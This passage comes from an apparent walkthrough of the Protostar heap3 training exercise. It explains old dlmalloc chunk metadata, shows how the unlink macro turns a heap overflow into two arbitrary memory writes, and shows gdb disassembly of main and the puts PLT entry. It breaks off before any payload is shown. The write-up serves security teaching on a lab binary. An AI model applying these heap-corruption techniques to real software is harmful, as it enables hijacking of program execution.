</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>

<p>The description at the top of the level is</p>

<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
change program execution.</p></blockquote>

<p>All these exercises are on 32-bit x86 architecture.</p>

<h2>Background on dlmalloc</h2>

<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
Upon a free()&hellip;&rdquo;</a> provides useful background.</p>

<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
space itself.</p>

<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>

<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
<code>data</code> starts.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.            +----------------------------------+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | size                             |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>      mem -> | data                             |
</span><span class='line'>             : ...                              :
</span><span class='line'>             +----------------------------------+
</span><span class='line'>nextchunk -> | prev_size ...                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>


<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>

<ul>
<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
<li>Once we <code>free()</code> the chunk using <code>free(mem)</code>, the memory is released, and if
its neighboring chunks aren&rsquo;t free, dlmalloc will clear the next chunk&rsquo;s <code>PREV_INUSE</code> and add the
chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
pointer at <code>mem</code>.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.            +----------------------------------+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | size                             |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>      mem -> | fd                               |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | bk                               |
</span><span class='line'>             +----------------------------------+
</span><span class='line'>             | (old memory, can be zero bytes)  |
</span><span class='line'>             :                                  :
</span><span class='line'>
</span><span class='line'>nextchunk -> | prev_size ...                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure>


<ul>
<li>If neighboring chunks are free, dlmalloc will merge the just freed chunk with its neighboring
chunks. The two neighboring free chunks are in a doubly-linked list. dlmalloc first removes the
neighboring chunk at the lower memory address from the list, merges it with the recently freed
chunk, and repeats this for the neighboring chunk at the higher memory address. The unlinking is
done with a macro called <code>unlink()</code> which removes an entry from a doubly-linked list and ties the
loose ends of the list back together.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define unlink(P, BK, FD)                                                     \</span>
</span><span class='line'><span class="cp">{                                                                             \</span>
</span><span class='line'><span class="cp">  BK = P-&gt;bk;                                                                 \</span>
</span><span class='line'><span class="cp">  FD = P-&gt;fd;                                                                 \</span>
</span><span class='line'><span class="cp">  FD-&gt;bk = BK;                                                                \</span>
</span><span class='line'><span class="cp">  BK-&gt;fd = FD;                                                                \</span>
</span><span class='line'><span class="cp">}                                                                             \</span>
</span></code></pre></td></tr></table></div></figure>


<p>Written with pointer notation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BK</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>  <span class="err">#</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">P</span> <span class="o">+</span> <span class="mi">12</span> <span class="n">stored</span> <span class="n">in</span> <span class="n">BK</span>
</span><span class='line'><span class="n">FD</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>   <span class="err">#</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">P</span> <span class="o">+</span> <span class="mi">8</span> <span class="n">stored</span> <span class="n">in</span> <span class="n">FD</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span> <span class="err">#</span> <span class="n">set</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span> <span class="n">to</span> <span class="n">BK</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>  <span class="err">#</span> <span class="n">set</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">memory</span> <span class="n">address</span> <span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span> <span class="n">to</span> <span class="n">FD</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
classifies these chunks as &ldquo;fastbins.&rdquo;</p>

<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>

<h2>What the heap looks like in heap3.c</h2>

<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
pagination.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span>
</span><span class='line'>
</span><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="err">$</span> <span class="n">gdb</span> <span class="n">heap3</span>
</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">GDB</span><span class="p">)</span> <span class="mf">7.0.1</span><span class="o">-</span><span class="n">debian</span>
</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2009</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="n">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="nl">http</span><span class="p">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;</span>
</span><span class='line'><span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="nl">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="n">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="p">.</span>
</span><span class='line'><span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="p">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
</span><span class='line'><span class="n">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="p">.</span>
</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">&quot;i486-linux-gnu&quot;</span><span class="p">.</span>
</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="nl">see</span><span class="p">:</span>
</span><span class='line'><span class="o">&lt;</span><span class="nl">http</span><span class="p">:</span><span class="c1">//www.gnu.org/software/gdb/bugs/&gt;...</span>
</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span><span class="p">...</span><span class="n">done</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">set</span> <span class="n">pagination</span> <span class="n">off</span>
</span></code></pre></td></tr></table></div></figure>


<p>We first disassemble the <code>main()</code> function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">main</span>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="nl">main</span><span class="p">:</span>
</span><span class='line'><span class="mh">0x08048889</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="n">ebp</span>
</span><span class='line'><span class="mh">0x0804888a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'><span class="mh">0x0804888c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>    <span class="n">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
</span><span class='line'><span class="mh">0x0804888f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x08048892</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x08048899</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804889e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488a2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x080488a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488ae</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488b2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">41</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x20</span>
</span><span class='line'><span class="mh">0x080488b9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048ff2</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488be</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488c2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488c5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span>
</span><span class='line'><span class="mh">0x080488c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488ca</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488ce</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">69</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488d2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488d5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488da</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488dd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;:</span>   <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span>
</span><span class='line'><span class="mh">0x080488e0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488e2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488e6</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488ea</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488ed</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x080488f2</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488f5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xc</span>
</span><span class='line'><span class="mh">0x080488f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">111</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x080488fa</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x080488fe</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x08048902</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">121</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x08048905</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804890a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x1c</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x0804890e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">133</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x08048911</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x08048916</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">141</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x0804891a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x0804891d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x08048922</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">]</span>
</span><span class='line'><span class="mh">0x08048926</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">157</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
</span><span class='line'><span class="mh">0x08048929</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">160</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804892e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">165</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x804ac27</span>
</span><span class='line'><span class="mh">0x08048935</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804893a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">177</span><span class="o">&gt;:</span>  <span class="n">leave</span>
</span><span class='line'><span class="mh">0x0804893b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;:</span>  <span class="n">ret</span>
</span><span class='line'><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
entry at address <code>0x8048790</code>. If we disassemble that address we see</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="mh">0x8048790</span>
</span><span class='line'><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">puts</span><span class="err">@</span><span class="nl">plt</span><span class="p">:</span>
</span><span class='line'><span class="mh">0x08048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x804b128</span>
